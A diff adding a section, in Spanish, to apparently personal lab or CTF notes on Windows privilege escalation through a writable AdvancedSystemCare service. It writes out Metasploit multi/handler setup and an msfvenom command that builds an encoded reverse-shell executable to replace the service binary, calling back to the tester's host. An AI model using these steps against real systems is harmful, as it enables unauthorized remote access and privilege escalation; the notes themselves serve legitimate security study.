@@ -242,4 +242,26 @@ Check                           : Modifiable Service Files
 Se nos dice que chequemos el servicio con CanRestart option en true, el cual es: 
 AdvancedSystemCareService9
 
+### Escalamiento real de privilegios
+Se pone como background la sesión actual
+- background
+Se usa el exploit multihandler
+- use exploit/multi/handler
+Se usa el reverse tcp de windows como payload
+- set payload windows/shell/reverse_tcp
+  
+![image](https://user-images.githubusercontent.com/44788583/149712905-7a9c7cb5-0456-4341-83ba-502f7f4618b0.png)
 
+Ahora en otra terminal se usará msfvenom:
+
+- msfvenom -p windows/shell_reverse_tcp LHOST=10.10.154.134 LPORT=1337 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+![image](https://user-images.githubusercontent.com/44788583/149713649-4067569a-e144-4746-b4aa-6b0b98a2aec1.png)
+OJO QUE SE PUSO EN EL PUERTO 137 y que el LHOST es la ip de mi máquina 10.10.154.134 y el nombre del servicio es el vulnerable ASCService.exe
+
+En la otra terminal, donde tengo la background session y el exploit de multi handler:
+- set LHOSTS 10.10.154.134 (mi ip)
+- set LPORT 1337 (el que definí en msfvenom)
+- exploit -j
+![image](https://user-images.githubusercontent.com/44788583/149714400-2405f1f6-651c-46bf-b526-1f370e690d0e.png)
+- sessions -i 1 (para interactuar con la sesión)
+ 
